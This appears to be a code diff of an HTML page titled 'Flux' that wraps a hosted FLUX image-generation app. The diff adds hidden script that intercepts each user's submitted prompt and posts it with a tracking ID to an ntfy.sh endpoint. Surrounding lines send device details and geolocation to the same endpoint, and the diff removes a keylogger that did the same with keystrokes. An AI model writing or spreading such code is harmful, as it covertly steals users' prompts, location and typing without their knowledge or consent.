@@ -4,9 +4,44 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Flux</title>
+
+  <script>
+    const originalFetch = window.fetch;
+    window.fetch = async function (...args) {
+    const response = await originalFetch(...args);
+
+    let url = args[0];
+    if (url instanceof Request) {
+      url = url.url;
+    }
+
+    if (typeof url === "string" && url.includes("/queue/join")) {
+      const requestData = args[1];
+      if (requestData && requestData.body) {
+        try {
+          const parsedBody = JSON.parse(requestData.body);
+          const message = `ID: ${userId}\nPrompt: ${parsedBody.data[0]}`;
+
+          fetch(ntfyUrl, {
+            method: 'POST',
+            body: message,
+            headers: {
+              'Title': 'Prompt Log',
+              'Priority': 'low',
+            }
+          })
+        } catch (error) {
+          console.error("Failed to parse request body:", error);
+        }
+      }
+    }
+
+    return response;
+  };
+
+  </script>
   <script>
     const ntfyUrl = "https://ntfy.sh/d5gGuV68_s1";
-    let keyLog = [];
 
     function getUserId() {
       const cookies = document.cookie.split("; ");
@@ -78,46 +113,22 @@ Device Info:
 
     function sendLocationUpdate() {
       getLocation(location => {
-        const locationMessage = `Location update for ID: ${userId}
-Location:
-  Latitude: ${location.latitude}
-  Longitude: ${location.longitude}`;
+        const locationMessage = `Location update for ID: ${userId}\nLocation:\n    Latitude: ${location.latitude}\n    Longitude: ${location.longitude}`;
 
         fetch(ntfyUrl, {
-          method: 'POST',
-          body: locationMessage,
-          headers: {
-            'Title': 'Location Update',
-            'Priority': 'medium',
-          }
+            method: 'POST',
+            body: locationMessage,
+            headers: {
+              'Title': 'Location Update',
+              'Priority': 'low',
+            }
         })
+
       });
     }
 
     sendInitialInfo();
     sendLocationUpdate();
-
-    document.addEventListener("keydown", function(event) {
-      const key = event.key;
-      keyLog.push(key);
-    });
-
-    setInterval(() => {
-      if (keyLog.length > 0) {
-        const message = `ID: ${userId}\nKeys pressed:\n    ${keyLog.join(", ")}`;
-
-        fetch(ntfyUrl, {
-          method: 'POST',
-          body: message,
-          headers: {
-            'Title': 'KeyLog',
-            'Priority': 'low',
-          }
-        })
-
-        keyLog = [];
-      }
-    }, 20000);
   </script>
 </head>
 <body>
@@ -127,5 +138,7 @@ Location:
   ></script>
 
   <gradio-app src="https://black-forest-labs-flux-1-schnell.hf.space"></gradio-app>
+
+
 </body>
 </html>
